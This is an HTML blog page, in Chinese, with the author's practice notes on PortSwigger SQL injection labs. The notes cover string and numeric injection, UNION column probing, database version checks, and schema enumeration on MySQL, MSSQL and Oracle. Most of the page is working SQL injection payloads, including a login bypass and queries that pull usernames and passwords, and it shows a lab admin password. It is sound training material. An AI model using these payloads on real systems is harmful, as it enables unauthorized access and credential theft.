@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>SQL注入-刷题A | Web_Security</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="针对不同数据库的备忘录可在链接中找。
+大体分类：
+T0~T1 字符/数字型注入
+T2~T5 union注入
+T6~T10 数据库的版本问题&#43;union注入和数据库本身保留字
+T11~T13盲注
+T14带外
+T0允许检索隐藏数据的注入 知道注入点以后，判断属于字符型注入还是数字型注入
+whatever&#39; or 1=1-- url中用加号链接，加号就代表空格
+https://insecure-website.com/products?category=Gifts&#39;&#43;OR&#43;1=1-- T1允许绕过登录的注入 已知我需要拿用户名administrator登录
+administrator&#39;-- UNION从其他表中检索数据 T2测试列数 &#39; UNION SELECT NULL-- &#39; UNION SELECT NULL,NULL-- &#39; UNION SELECT NULL,NULL,NULL-- 或者 &#39; ORDER BY 1-- &#39; ORDER BY 2-- &#39; ORDER BY 3-- T3查找具有有用数据类型的列 通常对我们有用的数据类型都是字符串的形式。
+Accessories&#39; UNION SELECT &#39;nEsVgZ&#39;,NULL,NULL-- Accessories&#39; UNION SELECT NULL,&#39;nEsVgZ&#39;,NULL-- Accessories&#39; UNION SELECT NULL,NULL,&#39;nEsVgZ&#39;-- 用第二行测试的时候能返回出数据，说明字符串变量在中间。
+T4union攻击检索相关数据 Accessories&#39; union select username,password from users-- 获取其他有用的表名以及某些列名在 SQL 注入攻击中检查数据库 |网络安全学院 (portswigger.">
+    <meta name="generator" content="Hugo 0.104.3" />
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+    
+    
+    
+      
+
+    
+
+    
+    
+    <meta property="og:title" content="SQL注入-刷题A" />
+<meta property="og:description" content="针对不同数据库的备忘录可在链接中找。
+大体分类：
+T0~T1 字符/数字型注入
+T2~T5 union注入
+T6~T10 数据库的版本问题&#43;union注入和数据库本身保留字
+T11~T13盲注
+T14带外
+T0允许检索隐藏数据的注入 知道注入点以后，判断属于字符型注入还是数字型注入
+whatever&#39; or 1=1-- url中用加号链接，加号就代表空格
+https://insecure-website.com/products?category=Gifts&#39;&#43;OR&#43;1=1-- T1允许绕过登录的注入 已知我需要拿用户名administrator登录
+administrator&#39;-- UNION从其他表中检索数据 T2测试列数 &#39; UNION SELECT NULL-- &#39; UNION SELECT NULL,NULL-- &#39; UNION SELECT NULL,NULL,NULL-- 或者 &#39; ORDER BY 1-- &#39; ORDER BY 2-- &#39; ORDER BY 3-- T3查找具有有用数据类型的列 通常对我们有用的数据类型都是字符串的形式。
+Accessories&#39; UNION SELECT &#39;nEsVgZ&#39;,NULL,NULL-- Accessories&#39; UNION SELECT NULL,&#39;nEsVgZ&#39;,NULL-- Accessories&#39; UNION SELECT NULL,NULL,&#39;nEsVgZ&#39;-- 用第二行测试的时候能返回出数据，说明字符串变量在中间。
+T4union攻击检索相关数据 Accessories&#39; union select username,password from users-- 获取其他有用的表名以及某些列名在 SQL 注入攻击中检查数据库 |网络安全学院 (portswigger." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://aiguamumu.github.io/post/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5-%E5%88%B7%E9%A2%98A.html" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-12-18T17:35:33+08:00" />
+<meta property="article:modified_time" content="2022-12-18T17:35:33+08:00" /><meta property="og:site_name" content="Web_Security" />
+
+<meta itemprop="name" content="SQL注入-刷题A">
+<meta itemprop="description" content="针对不同数据库的备忘录可在链接中找。
+大体分类：
+T0~T1 字符/数字型注入
+T2~T5 union注入
+T6~T10 数据库的版本问题&#43;union注入和数据库本身保留字
+T11~T13盲注
+T14带外
+T0允许检索隐藏数据的注入 知道注入点以后，判断属于字符型注入还是数字型注入
+whatever&#39; or 1=1-- url中用加号链接，加号就代表空格
+https://insecure-website.com/products?category=Gifts&#39;&#43;OR&#43;1=1-- T1允许绕过登录的注入 已知我需要拿用户名administrator登录
+administrator&#39;-- UNION从其他表中检索数据 T2测试列数 &#39; UNION SELECT NULL-- &#39; UNION SELECT NULL,NULL-- &#39; UNION SELECT NULL,NULL,NULL-- 或者 &#39; ORDER BY 1-- &#39; ORDER BY 2-- &#39; ORDER BY 3-- T3查找具有有用数据类型的列 通常对我们有用的数据类型都是字符串的形式。
+Accessories&#39; UNION SELECT &#39;nEsVgZ&#39;,NULL,NULL-- Accessories&#39; UNION SELECT NULL,&#39;nEsVgZ&#39;,NULL-- Accessories&#39; UNION SELECT NULL,NULL,&#39;nEsVgZ&#39;-- 用第二行测试的时候能返回出数据，说明字符串变量在中间。
+T4union攻击检索相关数据 Accessories&#39; union select username,password from users-- 获取其他有用的表名以及某些列名在 SQL 注入攻击中检查数据库 |网络安全学院 (portswigger."><meta itemprop="datePublished" content="2022-12-18T17:35:33+08:00" />
+<meta itemprop="dateModified" content="2022-12-18T17:35:33+08:00" />
+<meta itemprop="wordCount" content="661">
+<meta itemprop="keywords" content="SQL注入," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SQL注入-刷题A"/>
+<meta name="twitter:description" content="针对不同数据库的备忘录可在链接中找。
+大体分类：
+T0~T1 字符/数字型注入
+T2~T5 union注入
+T6~T10 数据库的版本问题&#43;union注入和数据库本身保留字
+T11~T13盲注
+T14带外
+T0允许检索隐藏数据的注入 知道注入点以后，判断属于字符型注入还是数字型注入
+whatever&#39; or 1=1-- url中用加号链接，加号就代表空格
+https://insecure-website.com/products?category=Gifts&#39;&#43;OR&#43;1=1-- T1允许绕过登录的注入 已知我需要拿用户名administrator登录
+administrator&#39;-- UNION从其他表中检索数据 T2测试列数 &#39; UNION SELECT NULL-- &#39; UNION SELECT NULL,NULL-- &#39; UNION SELECT NULL,NULL,NULL-- 或者 &#39; ORDER BY 1-- &#39; ORDER BY 2-- &#39; ORDER BY 3-- T3查找具有有用数据类型的列 通常对我们有用的数据类型都是字符串的形式。
+Accessories&#39; UNION SELECT &#39;nEsVgZ&#39;,NULL,NULL-- Accessories&#39; UNION SELECT NULL,&#39;nEsVgZ&#39;,NULL-- Accessories&#39; UNION SELECT NULL,NULL,&#39;nEsVgZ&#39;-- 用第二行测试的时候能返回出数据，说明字符串变量在中间。
+T4union攻击检索相关数据 Accessories&#39; union select username,password from users-- 获取其他有用的表名以及某些列名在 SQL 注入攻击中检查数据库 |网络安全学院 (portswigger."/>
+
+	
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  
+  <header class="cover bg-top" style="background-image: url('https://aiguamumu.github.io/images/laeeb.jpg');">
+    <div class="bg-black-60">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        Web_Security
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/post.html" title="Articles 页">
+              Articles
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/contact.html" title="Contact 页">
+              Contact
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+<div class="ananke-socials">
+  
+    <a href="https://twitter.com/GoHugoIO" target="_blank" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+      <div class="tc-l pv6 ph3 ph4-ns">
+        
+          <h1 class="f2 f1-l fw2 white-90 mb0 lh-title">SQL注入-刷题A</h1>
+          
+        
+      </div>
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked">
+          
+        ARTICLES
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+      
+      <a href="https://twitter.com/share?url=https://aiguamumu.github.io/post/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5-%E5%88%B7%E9%A2%98A.html&amp;text=SQL%e6%b3%a8%e5%85%a5-%e5%88%b7%e9%a2%98A" class="ananke-social-link twitter no-underline" aria-label="share on Twitter">
+        
+        <span class="icon"> <svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+        
+      </a>
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">SQL注入-刷题A</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2022-12-18T17:35:33+08:00">十二月 18, 2022</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><p>针对不同数据库的备忘录可在链接中找。</p>
+<p>大体分类：</p>
+<p>T0~T1 字符/数字型注入</p>
+<p>T2~T5  union注入</p>
+<p>T6~T10 数据库的版本问题+union注入和数据库本身保留字</p>
+<p>T11~T13盲注</p>
+<p>T14带外</p>
+<h1 id="t0允许检索隐藏数据的注入">T0允许检索隐藏数据的注入</h1>
+<p>知道注入点以后，判断属于字符型注入还是数字型注入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>whatever<span style="color:#e6db74">&#39; or 1=1--
+</span></span></span></code></pre></div><p>url中用加号链接，加号就代表空格</p>
+<pre tabindex="0"><code>https://insecure-website.com/products?category=Gifts&#39;+OR+1=1--
+</code></pre><h1 id="t1允许绕过登录的注入">T1允许绕过登录的注入</h1>
+<p>已知我需要拿用户名administrator登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>administrator<span style="color:#e6db74">&#39;--
+</span></span></span></code></pre></div><h1 id="union从其他表中检索数据">UNION从其他表中检索数据</h1>
+<h2 id="t2测试列数">T2测试列数</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#66d9ef">NULL</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULL,NULL--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">或者
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#ae81ff">1</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39; ORDER BY 2--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#ae81ff">3</span><span style="color:#75715e">--
+</span></span></span></code></pre></div><p><img src="images/image-20221116204720663.png" alt="image-20221116204720663"></p>
+<h2 id="t3查找具有有用数据类型的列">T3查找具有有用数据类型的列</h2>
+<p>通常对我们有用的数据类型都是字符串的形式。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39; UNION SELECT &#39;</span>nEsVgZ<span style="color:#e6db74">&#39;,NULL,NULL-- 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accessories&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#e6db74">&#39;nEsVgZ&#39;</span>,<span style="color:#66d9ef">NULL</span><span style="color:#75715e">-- 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Accessories<span style="color:#e6db74">&#39; UNION SELECT NULL,NULL,&#39;</span>nEsVgZ<span style="color:#e6db74">&#39;-- 
+</span></span></span></code></pre></div><p>用第二行测试的时候能返回出数据，说明字符串变量在中间。</p>
+<h2 id="t4union攻击检索相关数据">T4union攻击检索相关数据</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39; union select username,password from users--
+</span></span></span></code></pre></div><p>获取其他有用的表名以及某些列名<a href="https://portswigger.net/web-security/sql-injection/examining-the-database">在 SQL 注入攻击中检查数据库 |网络安全学院 (portswigger.net)</a></p>
+<p>爆得管理员账号和密码：<code>administrator</code>   <code>oqo2a0518xsi2ewtfs44</code></p>
+<h2 id="t5检索单个列中的多个值">T5检索单个列中的多个值</h2>
+<blockquote>
+<p>为什么要让返回的多个字段拼接成一个字段的原因：</p>
+<blockquote>
+<p>因为注入点的限制发现，有用的字符类型 的列只有一列（也就是只能查到一个字段的数据），</p>
+<p>而我们需要的数据有好几列，所以想要查到的数据完整，只能用拼接的方式。</p>
+</blockquote>
+</blockquote>
+<p>检查列数和字符列是哪一个：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39; union select null,&#39;</span>aca<span style="color:#e6db74">&#39;-- 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#试过第二列一列是字符型
+</span></span></span></code></pre></div><p>用保留字爆出表名，找到可能存储的user表：</p>
+<pre tabindex="0"><code class="language-SQ;" data-lang="SQ;">Accessories&#39; union select null,table_name from information_schema.TABLES--
+</code></pre><p>继续爆出列名，发现password、username：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39; union select null,column_name from information_schema.columns where table_name=&#39;</span>users<span style="color:#e6db74">&#39;--
+</span></span></span></code></pre></div><p>但是因为我们要查两个字段的内容，而注入点只能返回一个字段的东西,所以想到用拼接函数构造payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39; union select null,CONCAT_WS(&#39;</span><span style="color:#f92672">~</span><span style="color:#e6db74">&#39;,USERNAME,PASSWORD) from USERS--
+</span></span></span></code></pre></div><h1 id="sql注入检查数据库">SQL注入检查数据库</h1>
+<blockquote>
+<p>不同数据库的目录清单<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL注入备忘单|网络安全学院 (portswigger.net)</a></p>
+</blockquote>
+<h2 id="先确定数据库的版本">先确定数据库的版本</h2>
+<ul>
+<li><img src="images/image-20221117151908674.png" alt="image-20221117151908674"></li>
+<li><img src="images/image-20221117201907974.png" alt="image-20221117201907974"></li>
+</ul>
+<h3 id="t6查询oracle的类型和版本">T6查询Oracle的类型和版本</h3>
+<p>首先确定了列数以及类型</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39;union select null,null from dual--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accessories&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">UNION</span><span style="color:#f92672">+</span><span style="color:#66d9ef">SELECT</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#e6db74">&#39;def&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">+</span>dual<span style="color:#75715e">--
+</span></span></span></code></pre></div><p>然后查询数据库版本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39; UNION SELECT banner,&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39; FROM v$version--
+</span></span></span></code></pre></div><h3 id="t7查询microsoft的类型和版本">T7查询Microsoft的类型和版本</h3>
+<blockquote>
+<p>踩坑：</p>
+<p>sql注入的语句要写在burpsuite抓到的包里，且空格需要用加号代替。才能看出返回的结果到底报不报错。</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>gifts<span style="color:#e6db74">&#39;+union+select+@@version,&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;#
+</span></span></span></code></pre></div><h2 id="再查询库本身带的保留字">再查询库本身带的保留字</h2>
+<ul>
+<li><img src="images/image-20221117214909355.png" alt="image-20221117214909355"></li>
+</ul>
+<h3 id="t8列出非oracle数据库的内容">T8列出非Oracle数据库的内容</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select &#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">table_name</span>,<span style="color:#66d9ef">null</span> <span style="color:#66d9ef">from</span> information_schema.tables<span style="color:#75715e">--
+</span></span></span></code></pre></div><p>找到可能的用户名-密码表“users_czbssr”</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select column_name,null from information_schema.columns WHERE table_name=&#39;</span>users_czbssr<span style="color:#e6db74">&#39;--
+</span></span></span></code></pre></div><p>找到可能的两个列名username_cbmpsc、password_tcusrs</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select username_cbmpsc,password_tcusrs from users_czbssr--
+</span></span></span></code></pre></div><p>找到administrator对应的密码。</p>
+<h3 id="t9列出oracle上的数据库内容">T9列出Oracle上的数据库内容</h3>
+<p>判断出有两个都为字符类型的列：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Lifestyle<span style="color:#e6db74">&#39;+union+select+&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;+from+dual--
+</span></span></span></code></pre></div><p>Oracle查表用<code>all_tables</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Lifestyle<span style="color:#e6db74">&#39;+union+select+table_name,&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;+from+all_tables--
+</span></span></span></code></pre></div><p>找到可能的表名USERS_OJOCYX，接着查可能的列名本身（在all_tab_columns里找）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Lifestyle<span style="color:#e6db74">&#39;+union+select+COLUMN_name,&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;+from+all_tab_columns+where+table_name=&#39;</span>USERS_LTNNSA<span style="color:#e6db74">&#39;--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#踩坑：只能是双引号不能是单引号
+</span></span></span></code></pre></div><p>找到可能的列PASSWORD_BOGRBE，USERNAME_HUXQNN查列中的数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Lifestyle<span style="color:#e6db74">&#39;+union+select+PASSWORD_TPSLJZ,USERNAME_EGBQKW+from+USERS_LTNNSA--
+</span></span></span></code></pre></div><h1 id="oracle数据库的sql注入">Oracle数据库的SQL注入</h1>
+<blockquote>
+<p>不同版本的数据库+检查数据库</p>
+<p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database">Examining the database in SQL injection attacks | Web Security Academy (portswigger.net)</a></p>
+</blockquote>
+<h2 id="oracle与mysql的最大区别">Oracle与Mysql的最大区别</h2>
+<ul>
+<li>
+<p><strong>Oracle会对字段的类型敏感</strong>，也就是说我们需要在字符型字段使用字符型类型，在整型字段使用整型数据才可以。</p>
+<p>比如不能直接：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION select 1,2#
+</span></span></span></code></pre></div><p>而是应该：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION select &#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">null</span><span style="color:#e6db74">&#39; from dual# 
+</span></span></span></code></pre></div></li>
+<li>
+<p>如果是Oracle数据库，<strong>在进行union注入时，要额外加上<code>from dual</code></strong></p>
+<p>比如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>Accessories<span style="color:#e6db74">&#39;union select null,null from dual--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accessories&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">UNION</span><span style="color:#f92672">+</span><span style="color:#66d9ef">SELECT</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#e6db74">&#39;def&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">+</span>dual<span style="color:#75715e">--
+</span></span></span></code></pre></div><p><code>dual</code>是Oracle中内置的一个表格</p>
+</li>
+<li>
+<p><strong>不会有信息模式的视图</strong></p>
+</li>
+</ul>
+<h2 id="t10判断是否是oracle数据库">T10判断是否是Oracle数据库</h2>
+<p>例如：（假设有两个列）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; order by 2--     返回200正确
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span><span style="color:#75715e">--		返回500错误
+</span></span></span></code></pre></div><p>说明一定是Oracle，因为只有Oracle的联合注入必须要加<code>from dual</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select null.null FROM dual--		返回200正确
+</span></span></span></code></pre></div><h2 id="oracle常用符号之双管道序列">Oracle常用符号之双管道序列</h2>
+<p>在Mysql和maria中是“或”的意思。</p>
+<p><code>||</code>做字符串的串联/链接</p>
+<blockquote>
+<p>用合适的分隔符做分区组合</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT username || &#39;</span><span style="color:#f92672">~</span><span style="color:#e6db74">&#39; || password FROM users--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#表示把查询到的username和password用符号‘~’链接起来,即username~password
+</span></span></span></code></pre></div><blockquote>
+<p>做链接的内容是执行后的sql语句</p>
+</blockquote>
